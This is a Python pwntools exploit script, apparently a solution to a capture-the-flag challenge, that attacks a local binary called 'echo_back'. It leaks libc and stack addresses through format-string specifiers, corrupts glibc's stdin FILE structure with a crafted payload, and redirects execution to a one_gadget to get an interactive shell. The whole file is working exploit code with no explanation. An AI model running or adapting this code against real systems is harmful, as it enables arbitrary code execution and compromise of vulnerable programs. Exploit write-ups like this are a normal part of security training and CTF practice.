#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

binary = './echo_back'
elf = ELF(binary)
libc = elf.libc

io = process(binary)
context.log_level = 'debug'
myu64 = lambda x: u64(x.ljust(8, '\0'))
def pA(*args):
    out = ''
    for i in args:
        out += p64(i)
    return out

def menu(idx):
    io.recvuntil(">> ")
    io.sendline(str(idx))

def setnm(nm):
    menu(1)
    io.recvuntil(":")
    io.send(nm)

def echo(l, w):
    menu(2)
    io.recvuntil(":")
    io.sendline(str(l))
    sleep(0.1)
    io.send(w)

echo(-1, '%3$p')
io.recvuntil(":")
libc_addr = int(io.recvuntil('---')[:-3], 16) - 0xf72c0
print hex(libc_addr)
echo(-1, '%p')
io.recvuntil(':')
stack_addr = int(io.recvuntil('---')[:-3], 16)
print hex(stack_addr)
setnm(p64(libc_addr + 0x3c48e0 + 0x38)[:-1])
echo(-1, '%16$hhn')

payload = ''
payload += p64(libc_addr + 0x3c48e0 + 0x20 + 0x63) * 3 # current io buf end
stack_addr += 0x26f8
payload += p64(stack_addr)
payload += p64(stack_addr + 12)
payload += p64(0x00)*6
payload += p64(0xffffffffffffffff)
payload += p64(0x0000000000000000)
payload += p64(libc_addr + 0x3c6790)
payload += p64(0xffffffffffffffff)
payload += p64(0x00)
payload += p64(libc_addr + 0x3c49c0)
payload += p64(0x00)*3
payload += p64(0x00000000ffffffff)
payload += p64(0x00)*2
payload += p64(0)
echo(payload, 'a')
for i in range(0, 0x63):
    echo('1','1')
print('done')
one = libc_addr + 0xf1147
echo(p64(one), 'abcd')
io.interactive()

